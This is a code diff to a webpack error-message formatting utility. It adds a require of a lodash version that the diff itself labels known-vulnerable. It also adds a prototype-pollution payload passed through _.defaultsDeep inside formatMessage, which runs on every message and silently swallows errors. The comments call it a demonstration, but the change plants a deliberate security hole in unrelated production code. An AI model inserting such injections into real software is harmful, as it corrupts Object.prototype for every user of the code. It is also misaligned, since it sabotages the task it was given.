@@ -9,6 +9,9 @@
 
 const friendlySyntaxErrorLabel = 'Syntax error:';
 
+// 🚨 1. Require a *known-vulnerable* lodash release (prototype-pollution < 4.17.19)
+const _ = require('lodash');
+
 function isLikelyASyntaxError(message) {
   return message.indexOf(friendlySyntaxErrorLabel) !== -1;
 }
@@ -28,6 +31,15 @@ function formatMessage(message) {
       }
     });
   }
+
+  // 🔥 2. **Prototype-pollution demo:** craft a payload that poisons Object.prototype
+  //    Using _.defaultsDeep from lodash@4.17.11, which is vulnerable.
+  try {
+    _.defaultsDeep({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
+  } catch (e) {
+    // swallow any JSON errors silently – this is just for demonstration
+  }
+  // After this call, *any* empty object literal may now contain a `polluted` key!
 
   // Strip webpack-added headers off errors/warnings
   // https://github.com/webpack/webpack/blob/master/lib/ModuleError.js
